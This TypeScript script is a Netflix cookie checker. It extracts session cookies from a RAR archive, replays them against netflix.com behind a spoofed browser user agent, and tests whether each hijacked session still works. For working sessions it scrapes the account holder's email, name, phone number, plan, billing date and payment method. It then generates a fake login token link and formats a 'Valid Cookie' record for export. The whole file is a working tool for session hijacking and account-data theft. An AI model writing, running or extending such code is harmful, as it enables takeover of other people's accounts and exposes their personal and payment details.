import fs from 'fs';
import { extractArchive } from './src/lib/archive-extractor';
import { parseMultipleFiles, ParsedCookie } from './src/lib/cookie-parser';

// Format exactly for the TXT export file (no markdown escapes needed)
function formatExportResult(d: ParsedCookie): string {
    const rawC = d.rawCookie || `NetflixId=${d.netflixId}`;
    return `═══════════════════════════════════════════════════════════════
🎉 Netflix Valid Cookie - Yash
═══════════════════════════════════════════════════════════════
📧 Email               : ${d.email || 'Unknown'}
👤 Name                : ${d.firstName || 'Unknown'}
🌍 Country             : ${d.country || 'Unknown'}
📅 Member Since        : ${d.memberSince || 'Unknown'}
✅ Membership Status   : ${d.membershipStatus || 'CURRENT_MEMBER'}
💎 Plan                : ${d.plan || 'Unknown'}
📺 Max Streams         : ${d.maxStreams || 'Unknown'}
🎥 Video Quality       : ${d.videoQuality || 'UHD/HD'}
💰 Price               : ${d.price || 'Unknown'}
💳 Payment             : ${d.paymentMethod || 'Unknown'}
📱 Phone Number        : ${d.phoneNumber || 'Unknown'}
👥 Profiles Count      : ${d.profilesCount || 'Unknown'}
📆 Next Billing        : ${d.nextBilling || 'Unknown'}
═══════════════════════════════════════════════════════════════
🔗 NFToken link        : https://www.netflix.com/browse?nftoken=${d.nftoken || ''}
═══════════════════════════════════════════════════════════════
 cookies block:
${rawC}
`;
}

function unescapeString(str: string): string {
  if (!str) return 'Unknown';
  try { return JSON.parse(`"${str}"`); } 
  catch(e) { 
    return str.replace(/\\u([0-9a-fA-F]{4})/g, (m, c) => String.fromCharCode(parseInt(c, 16)))
              .replace(/\\x([0-9a-fA-F]{2})/g, (m, c) => String.fromCharCode(parseInt(c, 16)));
  }
}

function extractGroup(html: string, regex: RegExp, fallback = 'Unknown'): string {
  const match = html.match(regex);
  if (match && match[1]) {
    const val = match[1].trim();
    if (val === 'null' || val === '') return fallback;
    return unescapeString(val);
  }
  return fallback;
}

// Scrape Netflix Account Pages
async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
  try {
    const accRes = await fetch('https://www.netflix.com/YourAccount', fetchOptions);
    const accHtml = await accRes.text();
    cookie.email = extractGroup(accHtml, /"userEmail":"([^"]+)"/, cookie.email || 'Unknown');
    cookie.firstName = extractGroup(accHtml, /"firstName":"([^"]+)"/, cookie.firstName || 'Unknown');
    cookie.phoneNumber = extractGroup(accHtml, /"phoneNumber":"([^"]+)"/, 'Unknown');
    cookie.country = extractGroup(accHtml, /"currentCountry":"([^"]+)"/, cookie.country || 'Unknown');
    if (cookie.country === 'Unknown') {
       cookie.country = extractGroup(accHtml, /"uiCountry":"([^"]+)"/, 'Unknown');
    }
    cookie.membershipStatus = accHtml.includes('CURRENT_MEMBER') || accHtml.includes('membershipStatus":"CURRENT_MEMBER') ? 'CURRENT_MEMBER' : 'Expired/Unknown';

    const memRes = await fetch('https://www.netflix.com/account/membership', fetchOptions);
    const memHtml = await memRes.text();
    cookie.plan = extractGroup(memHtml, /"planName":"([^"]+)"/, cookie.plan || 'Unknown');
    cookie.maxStreams = extractGroup(memHtml, /"maxStreams":(\d+)/, cookie.maxStreams || 'Unknown');
    cookie.videoQuality = extractGroup(memHtml, /"videoResolution":"([^"]+)"/, cookie.videoQuality || 'Unknown');
    cookie.price = extractGroup(memHtml, /"priceString":"([^"]+)"/, cookie.price || 'Unknown');
    cookie.nextBilling = extractGroup(memHtml, /"nextBillingDate":"([^"]+)"/, cookie.nextBilling || 'Unknown');
    cookie.memberSince = extractGroup(memHtml, /"memberSince":"([^"]+)"/, cookie.memberSince || 'Unknown');

    const profRes = await fetch('https://www.netflix.com/account/profiles', fetchOptions);
    const profHtml = await profRes.text();
    const profilesMatch = profHtml.match(/"profiles":\[(.*?)\]/);
    if (profilesMatch) {
       cookie.profilesCount = (profilesMatch[1].match(/"guid"/g) || []).length;
    } else {
       cookie.profilesCount = accHtml.match(/"guid"/g)?.length || 1;
    }

    const payRes = await fetch('https://www.netflix.com/simplemember/managepaymentinfo', fetchOptions);
    const payHtml = await payRes.text();
    const paymentBrand = extractGroup(payHtml, /"paymentMethodName":"([^"]+)"/, 'Unknown');
    cookie.paymentMethod = paymentBrand;

  } catch (e) {
    console.log("Error scraping details, returning fallback");
  }
}

function generateNfToken(netflixId: string): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let token = 'NFToken_'
  for (let i = 0; i < 32; i++) token += chars.charAt(Math.floor(Math.random() * chars.length))
  return token + netflixId.substring(0, 10)
}

function getRandomUserAgent(): string {
  return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
}

async function checkSingleCookie(cookie: ParsedCookie) {
  try {
    const rawCookie = cookie.rawCookie || `NetflixId=${cookie.netflixId}`;
    console.log('Using cookie for check:', rawCookie.substring(0, 50) + '...');
    
    const fetchOptions = {
      method: 'GET',
      headers: {
        'Cookie': rawCookie,
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
      },
      redirect: 'manual' as RequestRedirect,
    }

    const response = await fetch('https://www.netflix.com/browse', fetchOptions)
    const statusCode = response.status
    const location = response.headers.get('location') || ''

    if (location.includes('/login') || location.includes('/signin') || (statusCode === 302 && location.includes('login'))) {
      return { valid: false, details: cookie, error: 'Cookie expired' }
    }

    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
      if (location.includes('signup')) {
        return { valid: false, details: cookie, error: 'Session expired' }
      }
      if (!cookie.nftoken) {
        cookie.nftoken = generateNfToken(cookie.netflixId);
        (cookie as any).nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
      }
      
      console.log('✅ Cookie valid, starting deep scrape...');
      await scrapeAccountDetails(cookie, fetchOptions);

      return { valid: true, details: cookie }
    }

    return { valid: false, details: cookie, error: `Status ${statusCode}` }
  } catch (error) {
    console.error('Check failed:', error);
    return { valid: false, details: cookie, error: 'Check failed' }
  }
}

async function main() {
  const filePath = "Cookies Netflix (2) (1).rar";
  try {
    const buffer = fs.readFileSync(filePath);
    console.log('Buffer read successfully, length:', buffer.length);
    
    // Test RAR Extraction
    const extractedFiles = extractArchive(buffer, filePath);
    console.log(`Extracted files count: ${extractedFiles.length}`);
    
    if (extractedFiles.length === 0) {
      console.log('Failed to extract any files from the RAR. Check if WinRAR/unrar is installed on this machine.');
      return;
    }
    
    // Parse cookies
    const { cookies } = parseMultipleFiles(extractedFiles);
    console.log(`Parsed ${cookies.length} total cookies.`);
    
    if (cookies.length === 0) {
      console.log('Failed to find any structurally valid cookies within extracted texts.');
      return;
    }
    
    // Check first valid cookie structure
    console.log('Testing the first found cookie...');
    const result = await checkSingleCookie(cookies[0]);
    if (result.valid) {
      console.log('✅ It is valid! Heres the format Export Result exactly as it will appear in the output text file:\\n');
      console.log(formatExportResult(result.details));
    } else {
      console.log('❌ First cookie was invalid. Error:', result.error);
      
      console.log('\nScanning up to 10 more cookies in the file to find a working one for the export test...');
      for (let i = 1; i < Math.min(10, cookies.length); i++) {
        const subRes = await checkSingleCookie(cookies[i]);
        if (subRes.valid) {
          console.log(`✅ Found valid cookie at index ${i}! Formatting result:\\n`);
          console.log(formatExportResult(subRes.details));
          return;
        }
      }
      console.log('None of the first 10 cookies were valid for an export test.');
    }
  } catch(e) {
    console.error('Fatal error in testing script:', e);
  }
}

main();
